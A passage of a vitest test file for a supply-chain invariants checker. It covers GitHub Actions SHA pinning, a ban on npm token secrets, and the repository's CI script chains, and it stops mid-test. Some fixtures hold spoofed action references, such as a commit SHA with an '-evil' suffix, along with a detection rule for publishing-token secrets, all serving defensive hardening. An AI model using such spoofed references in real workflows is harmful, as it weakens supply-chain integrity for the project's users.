import { describe, it, expect } from "vitest";
import {
  checkActionShaPins,
  checkCancellationCoverage,
  checkCiPackageScripts,
  checkNoTokenSecrets,
  checkSupplyChainInvariants,
} from "../../../scripts/check-supply-chain-invariants.mjs";
import { mkdtemp, mkdir, writeFile, rm } from "node:fs/promises";
import { join, resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

describe("checkActionShaPins", () => {
  it("passes when all uses are exact 40-char SHA pinned", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
      "      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    ].join("\n");
    expect(checkActionShaPins(content)).toEqual([]);
  });

  it("fails when a uses references a tag", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@v6.0.2",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("40-char commit SHA");
  });

  it("fails when a uses references main", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@main",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
  });

  it("fails when SHA has -evil suffix", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-evil",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("40-char commit SHA");
  });

  it("fails when SHA has /subpath suffix", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/subpath",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
  });

  it("passes for local action references (./)", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: ./local-action",
    ].join("\n");
    expect(checkActionShaPins(content)).toEqual([]);
  });
});

describe("checkNoTokenSecrets", () => {
  it("passes when no token secrets are referenced", () => {
    expect(checkNoTokenSecrets("run: npm publish")).toEqual([]);
  });

  it("fails when NPM_TOKEN is referenced", () => {
    const violations = checkNoTokenSecrets(
      "env:\n  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}",
    );
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("NPM_TOKEN");
  });

  it("fails when NODE_AUTH_TOKEN is referenced", () => {
    const violations = checkNoTokenSecrets(
      "env:\n  NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN }}",
    );
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("NODE_AUTH_TOKEN");
  });
});

describe("checkSupplyChainInvariants — against the real repo", () => {
  it("reports no failures", () => {
    const repoRoot = resolve(
      dirname(fileURLToPath(import.meta.url)),
      "..",
      "..",
      "..",
    );
    const { failures } = checkSupplyChainInvariants(repoRoot);
    expect(failures).toBe(0);
  });
});

describe("checkSupplyChainInvariants — synthetic tree", () => {
  let root: string | undefined;

  // This fixture mirrors the real .github/workflows/publish.yml structure.
  // Run script hashes are pinned by the checker, so the run: blocks must
  // match the real workflow exactly.
  const wellFormedPublish = [
    "name: Publish",
    "",
    "on:",
    "  push:",
    "    tags:",
    "      - 'v*'",
    "",
    "permissions: {}",
    "",
    "concurrency:",
    "  group: npm-publish-${{ github.ref }}",
    "  cancel-in-progress: false",
    "",
    "jobs:",
    "  prepare:",
    "    runs-on: ubuntu-latest",
    "    permissions:",
    "      contents: read",
    "    timeout-minutes: 15",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - run: pnpm release:check",
    "      - run: node scripts/check-package-tarball.mjs",
    "      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact/",
    "          retention-days: 7",
    "",
    "  publish:",
    "    name: Publish to npm via Trusted Publishing",
    "    runs-on: ubuntu-latest",
    "    needs: prepare",
    "    environment: npm-publish",
    "    permissions:",
    "      contents: read",
    "      id-token: write",
    "    outputs:",
    "      published_now: ${{ steps.publish.outputs.published_now }}",
    "    timeout-minutes: 5",
    "    steps:",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Set up Node",
    "        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 24",
    "          package-manager-cache: false",
    "      - name: Verify manifest and publish",
    "        id: publish",
    "        env:",
    "          EXPECTED_TAG: ${{ github.ref_name }}",
    "          EXPECTED_COMMIT: ${{ github.sha }}",
    "          NPM_CONFIG_PROVENANCE: 'true'",
    "        run: |",
    '          manifest="release-artifact/release-manifest.json"',
    '          tarball="release-artifact/package.tgz"',
    "",
    '          MANIFEST="$manifest" \\',
    '          TARBALL="$tarball" \\',
    "          node <<'NODE'",
    '          const fs = require("fs");',
    '          const crypto = require("crypto");',
    "",
    '          const m = JSON.parse(fs.readFileSync(process.env.MANIFEST, "utf8"));',
    "",
    '          if (m.package !== "code-pact") {',
    "            throw new Error(`unexpected package: ${JSON.stringify(m.package)}`);",
    "          }",
    "",
    '          const match = /^v(\\d+\\.\\d+\\.\\d+(?:-(?:alpha|beta|rc)\\.\\d+)?)$/.exec(process.env.EXPECTED_TAG ?? "");',
    "",
    "          if (!match) {",
    "            throw new Error(`unexpected workflow tag: ${JSON.stringify(process.env.EXPECTED_TAG)}`);",
    "          }",
    "",
    "          const expectedVersion = match[1];",
    "",
    "          if (m.tag !== process.env.EXPECTED_TAG) {",
    "            throw new Error(`manifest tag ${JSON.stringify(m.tag)} != workflow tag ${JSON.stringify(process.env.EXPECTED_TAG)}`);",
    "          }",
    "",
    "          if (m.version !== expectedVersion) {",
    "            throw new Error(`manifest version ${JSON.stringify(m.version)} != workflow version ${JSON.stringify(expectedVersion)}`);",
    "          }",
    "",
    "          if (m.commit !== process.env.EXPECTED_COMMIT) {",
    "            throw new Error(`manifest commit ${JSON.stringify(m.commit)} != workflow commit ${JSON.stringify(process.env.EXPECTED_COMMIT)}`);",
    "          }",
    "",
    "          if (!/^[0-9a-f]{64}$/.test(m.tarball_sha256)) {",
    '            throw new Error("manifest tarball_sha256 is invalid");',
    "          }",
    "",
    "          const bytes = fs.readFileSync(process.env.TARBALL);",
    '          const actual = crypto.createHash("sha256").update(bytes).digest("hex");',
    "",
    "          if (actual !== m.tarball_sha256) {",
    "            throw new Error(`tarball SHA-256 ${actual} != manifest ${m.tarball_sha256}`);",
    "          }",
    "          NODE",
    "",
    '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
    '          registry="https://registry.npmjs.org"',
    "",
    '          if npm view "code-pact@${version}" version --registry="$registry" >/dev/null 2>&1',
    "          then",
    '            echo "Version already exists; verification will follow."',
    '            echo "published_now=false" >> "$GITHUB_OUTPUT"',
    "          else",
    '            npm publish "./$tarball" --ignore-scripts --registry="$registry"',
    '            echo "published_now=true" >> "$GITHUB_OUTPUT"',
    "          fi",
    "",
    "  verify:",
    "    runs-on: ubuntu-latest",
    "    needs: [publish, prepare]",
    "    permissions:",
    "      contents: read",
    "    timeout-minutes: 10",
    "    steps:",
    "      - name: Checkout release tag",
    "        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          fetch-depth: 1",
    "          persist-credentials: false",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Set up Node",
    "        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 24",
    "      - name: Verify registry tarball",
    "        run: node scripts/verify-published-tarball.mjs",
    "      - name: Upload integrity artifact",
    "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1",
    "        with:",
    "          name: release-integrity",
    "          path: release-integrity.json",
    "          retention-days: 7",
    "",
    "  github-release:",
    "    name: Create verified GitHub Release",
    "    runs-on: ubuntu-latest",
    "    needs: [verify, prepare, publish]",
    "    permissions:",
    "      contents: write",
    "    timeout-minutes: 5",
    "    steps:",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Download integrity artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-integrity",
    "          path: release-integrity",
    "      - name: Create or reconcile GitHub Release",
    "        env:",
    "          GH_TOKEN: ${{ github.token }}",
    "          GH_REPO: ${{ github.repository }}",
    "          TAG: ${{ github.ref_name }}",
    "          PUBLISHED_NOW: ${{ needs.publish.outputs.published_now }}",
    "        run: |",
    '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
    '          shasum="$(node -p \'require("./release-integrity/release-integrity.json").shasum\')"',
    '          integrity="$(node -p \'require("./release-integrity/release-integrity.json").integrity\')"',
    '          local_sha256="$(node -p \'require("./release-integrity/release-integrity.json").local_sha256\')"',
    "",
    '          if [ "$PUBLISHED_NOW" = "true" ]',
    "          then",
    '            provenance_note="generated through Trusted Publishing"',
    "          else",
    '            provenance_note="existing-version rerun; verify the npm provenance badge manually"',
    "          fi",
    "",
    "          cat release-artifact/release-notes.md > final-notes.md",
    "          cat >> final-notes.md <<EOF",
    "",
    "          ## Integrity",
    "",
    "          - npm shasum: \\`$shasum\\`",
    "          - npm integrity: \\`$integrity\\`",
    "          - local tarball SHA-256: \\`$local_sha256\\`",
    "          - npm provenance: $provenance_note",
    "          EOF",
    "",
    '          if gh release view "$TAG" >/dev/null 2>&1',
    "          then",
    "            gh release edit \\",
    '              "$TAG" \\',
    "              --notes-file final-notes.md \\",
    "              --verify-tag",
    "          else",
    "            gh release create \\",
    '              "$TAG" \\',
    '              --title "$TAG" \\',
    "              --notes-file final-notes.md \\",
    "              --verify-tag",
    "          fi",
  ].join("\n");

  const wellFormedCi = [
    "name: CI",
    "",
    "on:",
    "  push:",
    "    branches: [main]",
    "  pull_request:",
    "",
    "permissions:",
    "  contents: read",
    "",
    "concurrency:",
    "  group: ci-${{ github.event.pull_request.number || github.ref }}",
    "  cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
    "",
    "jobs:",
    "  classify:",
    "    name: Classify change scope",
    "    runs-on: ubuntu-latest",
    "    outputs:",
    "      docs: ${{ steps.classify.outputs.docs }}",
    "      standard: ${{ steps.classify.outputs.standard }}",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          fetch-depth: 0",
    "          persist-credentials: false",
    "      - name: Classify changed files",
    "        id: classify",
    "        run: node scripts/verification-scope.mjs --base HEAD --format github",
    "",
    "  docs:",
    "    name: Docs checks",
    "    runs-on: ubuntu-latest",
    "    needs: [classify]",
    "    if: needs.classify.outputs.docs == 'true'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm check:docs",
    "",
    "  standard:",
    "    name: Standard gate (Node 22)",
    "    runs-on: ubuntu-latest",
    "    needs: [classify]",
    "    if: needs.classify.outputs.standard == 'true'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm test:ci",
    "",
    "  ci-status:",
    "    name: CI status",
    "    runs-on: ubuntu-latest",
    "    needs: [classify, docs, standard]",
    "    if: ${{ always() }}",
    "    steps:",
    "      - name: Verify CI results",
    "        run: |",
    '          docs_output="${{ needs.classify.outputs.docs }}"',
    '          standard_output="${{ needs.classify.outputs.standard }}"',
    '          if [ "$docs_output" != "true" ] && [ "$docs_output" != "false" ]; then',
    "            echo \"classify output docs is not a boolean: '$docs_output'\"",
    "            exit 1",
    "          fi",
    '          if [ "$standard_output" != "true" ] && [ "$standard_output" != "false" ]; then',
    "            echo \"classify output standard is not a boolean: '$standard_output'\"",
    "            exit 1",
    "          fi",
    '          if [ "${{ needs.classify.result }}" != "success" ]; then',
    '            echo "classify job did not succeed"',
    "            exit 1",
    "          fi",
    '          if [ "$docs_output" = "true" ] && [ "${{ needs.docs.result }}" != "success" ]; then',
    "            exit 1",
    "          fi",
    '          if [ "$standard_output" = "true" ] && [ "${{ needs.standard.result }}" != "success" ]; then',
    "            exit 1",
    "          fi",
  ].join("\n");

  const wellFormedCiDeep = [
    "name: Deep CI",
    "",
    "on:",
    "  workflow_dispatch:",
    "    inputs:",
    "      scope:",
    '        description: "Scope to run"',
    "        required: true",
    '        default: "linux-deep"',
    "        type: choice",
    "        options:",
    '          - "linux-deep"',
    '          - "node24"',
    '          - "windows"',
    '          - "all"',
    "",
    "permissions:",
    "  contents: read",
    "",
    "jobs:",
    "  linux-deep:",
    "    name: Linux deep gate (Node 22)",
    "    runs-on: ubuntu-latest",
    "    if: github.event.inputs.scope == 'all' || github.event.inputs.scope == 'linux-deep'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm test:ci:deep",
    "",
    "  node-24-smoke:",
    "    name: Node 24 compatibility smoke",
    "    runs-on: ubuntu-latest",
    "    if: github.event.inputs.scope == 'all' || github.event.inputs.scope == 'node24'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 24",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm typecheck",
    "      - run: pnpm test:unit",
    "      - run: pnpm build",
    "      - run: node dist/cli.js --version",
    "      - run: node dist/cli.js --json --version",
    "",
    "  windows-process-control:",
    "    name: Windows process-control (Node 22)",
    "    runs-on: windows-latest",
    "    if: github.event.inputs.scope == 'all' || github.event.inputs.scope == 'windows'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "",
    "      - run: pnpm check:toolchain-binaries",
    "      - run: pnpm typecheck",
    "      - run: pnpm build",
    "      - run: pnpm exec vitest run tests/unit/core/project-fs-authority-resolvers.test.ts tests/unit/commands/verify-process.test.ts",
    "      - run: pnpm exec vitest run --config vitest.integration.config.ts tests/integration/verify-timeout-abort.test.ts",
    "",
    "  deep-ci-status:",
    "    name: Deep CI status",
    "    runs-on: ubuntu-latest",
    "    needs: [linux-deep, node-24-smoke, windows-process-control]",
    "    if: ${{ always() }}",
    "    steps:",
    "      - name: Verify deep CI succeeded",
    "        run: |",
    '          scope="${{ github.event.inputs.scope }}"',
    "          ok=true",
    '          if [ "$scope" = "all" ] || [ "$scope" = "linux-deep" ]; then',
    '            if [ "${{ needs.linux-deep.result }}" != "success" ]; then',
    "              ok=false",
    "            fi",
    "          fi",
    '          if [ "$scope" = "all" ] || [ "$scope" = "node24" ]; then',
    '            if [ "${{ needs.node-24-smoke.result }}" != "success" ]; then',
    "              ok=false",
    "            fi",
    "          fi",
    '          if [ "$scope" = "all" ] || [ "$scope" = "windows" ]; then',
    '            if [ "${{ needs.windows-process-control.result }}" != "success" ]; then',
    "              ok=false",
    "            fi",
    "          fi",
    '          if [ "$ok" != "true" ]; then',
    "            exit 1",
    "          fi",
  ].join("\n");

  const wellFormedVerifyTimeoutAbort = [
    'import { runBoundedCommand } from "../../src/core/process/bounded-command.ts";',
    "",
    'describe.runIf(process.platform === "win32")("Windows bounded-command cancellation contract", () => {',
    '  it("times out a command tree through taskkill cleanup", async () => {',
    '    const result = await runBoundedCommand("node long-parent.mjs", dir, 750);',
    "    expect(result).toMatchObject({",
    "      timedOut: true,",
    '      termination: { strategy: "taskkill" },',
    "    });",
    "  });",
    '  it("aborts a command tree through taskkill cleanup", async () => {',
    '    const result = await runBoundedCommand("node long-parent.mjs", dir, 10_000, signal);',
    "    expect(result).toMatchObject({",
    "      aborted: true,",
    '      termination: { strategy: "taskkill" },',
    "    });",
    "  });",
    "});",
    "",
    'if (process.platform !== "win32") {',
    '  describe("CLI cancellation contract", () => {',
    '    it.each(["SIGINT", "SIGTERM"] as const)(',
    '      "cancels task complete on %s, removes descendants, and records no event",',
    "      async () => {",
    '        expect(JSON.parse(result.stdout)).toMatchObject({ error: { cause_code: "ABORTED" } });',
    "        expect((await loadMergedProgress(dir)).log.events).toHaveLength(0);",
    "      },",
    "    );",
    "  });",
    "}",
  ].join("\n");

  const wellFormedPackage = JSON.stringify(
    {
      packageManager: "pnpm@10.34.2",
      scripts: {
        test: "pnpm test:unit && pnpm test:integration",
        "test:integration": "pnpm test:integration:full",
        "test:integration:full":
          "pnpm build && vitest run --config vitest.integration.config.ts",
        "verify:base":
          "pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build",
        "verify:smoke":
          "pnpm test:integration:smoke && node dist/cli.js --version && node dist/cli.js --json --version",
        "verify:deep:extra":
          "pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && vitest run --config vitest.integration.config.ts && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json && pnpm test:cli:init-smoke",
        "test:ci": "pnpm verify:base && pnpm verify:smoke",
        "test:ci:deep": "pnpm verify:base && pnpm verify:deep:extra",
        "verify:local": "node scripts/verification-scope.mjs --local --run",
        "prepush:fast": "pnpm verify:local",
        "release:check":
          "pnpm typecheck && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      },
      devDependencies: {
        esbuild: "0.28.1",
        vite: "^8.1.4",
      },
    },
    null,
    2,
  );

  const wellFormedWorkspace = [
    "overrides:",
    "  esbuild: 0.28.1",
    "allowBuilds:",
    "  esbuild: false",
  ].join("\n");

  const wellFormedLock = [
    "lockfileVersion: '9.0'",
    "importers:",
    "  .:",
    "    devDependencies:",
    "      esbuild:",
    "        specifier: 0.28.1",
    "        version: 0.28.1",
    "      vite:",
    "        specifier: ^8.1.4",
    "        version: 8.1.4",
    "packages:",
    "  esbuild@0.28.1: {}",
    "  vite@8.1.4: {}",
    "snapshots:",
    "  esbuild@0.28.1: {}",
    "  vite@8.1.4: {}",
  ].join("\n");

  async function buildTree(
    overrides: {
      publishContent?: string;
      ciContent?: string;
      ciDeepContent?: string;
      securityContent?: string;
      packageContent?: string;
      workspaceContent?: string;
      lockContent?: string;
      verifyTimeoutAbortContent?: string;
    } = {},
  ): Promise<string> {
    const dir = await mkdtemp(join(tmpdir(), "sci-"));
    await mkdir(join(dir, ".github", "workflows"), { recursive: true });
    await mkdir(join(dir, "tests", "integration"), { recursive: true });
    await writeFile(
      join(dir, ".github", "workflows", "publish.yml"),
      overrides.publishContent ?? wellFormedPublish,
    );
    await writeFile(
      join(dir, ".github", "workflows", "ci.yml"),
      overrides.ciContent ?? wellFormedCi,
    );
    await writeFile(
      join(dir, ".github", "workflows", "ci-deep.yml"),
      overrides.ciDeepContent ?? wellFormedCiDeep,
    );
    await writeFile(
      join(dir, "SECURITY.md"),
      overrides.securityContent ?? "No local build references.",
    );
    await writeFile(
      join(dir, "package.json"),
      overrides.packageContent ?? wellFormedPackage,
    );
    await writeFile(
      join(dir, "pnpm-workspace.yaml"),
      overrides.workspaceContent ?? wellFormedWorkspace,
    );
    await writeFile(
      join(dir, "pnpm-lock.yaml"),
      overrides.lockContent ?? wellFormedLock,
    );
    await writeFile(
      join(dir, "tests", "integration", "verify-timeout-abort.test.ts"),
      overrides.verifyTimeoutAbortContent ?? wellFormedVerifyTimeoutAbort,
    );
    return dir;
  }

  async function cleanup() {
    if (root) {
      await rm(root, { recursive: true, force: true });
      root = undefined;
    }
  }

  function packageWithScript(name: string, value: string): string {
    const pkg = JSON.parse(wellFormedPackage) as {
      scripts: Record<string, string>;
    };
    pkg.scripts[name] = value;
    return JSON.stringify(pkg, null, 2);
  }

  function packageWithScripts(scripts: Record<string, string>): string {
    const pkg = JSON.parse(wellFormedPackage) as {
      scripts: Record<string, string>;
    };
    Object.assign(pkg.scripts, scripts);
    return JSON.stringify(pkg, null, 2);
  }

  it("passes on a well-formed tree", async () => {
    root = await buildTree();
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBe(0);
    await cleanup();
  });

  it("fails when Windows process-control coverage uses a name filter", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "      - run: pnpm exec vitest run --config vitest.integration.config.ts tests/integration/verify-timeout-abort.test.ts",
        '      - run: pnpm exec vitest run --config vitest.integration.config.ts -t "timeout"',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when required PR CI includes a Windows job", async () => {
    root = await buildTree({
      ciContent:
        wellFormedCi +
        "\n\n  windows-process-control:\n    runs-on: windows-latest\n    steps:\n      - run: pnpm build\n",
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when required PR CI runs full integration directly", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        "      - run: pnpm test:ci",
        "      - run: pnpm exec vitest run --config vitest.integration.config.ts",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Windows process-control coverage is missing from all workflows", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "windows-latest",
        "ubuntu-latest",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci accidentally includes full integration", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci",
        "pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build && vitest run --config vitest.integration.config.ts && pnpm test:integration:smoke && node dist/cli.js --version && node dist/cli.js --json --version",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci accidentally includes docs checks", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci",
        "pnpm check:supply-chain && pnpm check:docs && pnpm typecheck && pnpm test:unit && pnpm build && pnpm test:integration:smoke && node dist/cli.js --version && node dist/cli.js --json --version",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci omits smoke integration", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci",
        "pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build && node dist/cli.js --version && node dist/cli.js --json --version",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci:deep omits full integration", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci:deep",
        "pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json && pnpm test:cli:init-smoke",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test omits integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript("test", "pnpm test:unit"),
    );
    expect(violations).toContain(
      "package.json: scripts.test must invoke pnpm test:integration",
    );
  });

  it("fails when test conditionally invokes integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript("test", "pnpm test:unit || pnpm test:integration"),
    );
    expect(violations).toContain(
      "package.json: scripts.test must use a fail-fast && chain",
    );
  });

  it("fails when test ignores unit failures before integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript("test", "pnpm test:unit ; pnpm test:integration"),
    );
    expect(violations).toContain(
      "package.json: scripts.test must use a fail-fast && chain",
    );
  });

  it("allows pnpm run script invocations in fail-fast chains", async () => {
    const violations = checkCiPackageScripts(
      packageWithScripts({
        test: "pnpm run test:unit && pnpm run test:integration",
        "test:integration": "pnpm run test:integration:full",
        "test:integration:full":
          "pnpm run build && vitest run --config vitest.integration.config.ts",
        "release:check":
          "pnpm typecheck && pnpm run test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      }),
    );
    expect(violations).toEqual([]);
  });

  it("fails when full integration only echoes the build command", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "test:integration:full",
        "echo pnpm build && vitest run --config vitest.integration.config.ts",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.test:integration:full must invoke pnpm build",
    );
  });

  it("fails when full integration only echoes the vitest command", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "test:integration:full",
        "pnpm build && echo vitest run --config vitest.integration.config.ts",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.test:integration:full must run full integration",
    );
  });

  it("fails when test:integration omits full integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "test:integration",
        "vitest run --config vitest.integration.smoke.config.ts",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.test:integration must invoke pnpm test:integration:full",
    );
  });

  it("does not treat pnpm test:unit as pnpm test in release:check", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test:unit && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must invoke pnpm test",
    );
  });

  it("fails when release:check conditionally invokes test", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck || pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must use a fail-fast && chain",
    );
  });

  it("fails when release:check only echoes dist commands", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && echo node dist/cli.js validate --json && echo node dist/cli.js plan lint --include-quality --strict --json && echo node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js validate --json",
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js plan lint --include-quality --strict --json",
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js plan analyze --strict --json",
    );
  });

  it("fails when release:check adds arguments to a dist command", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
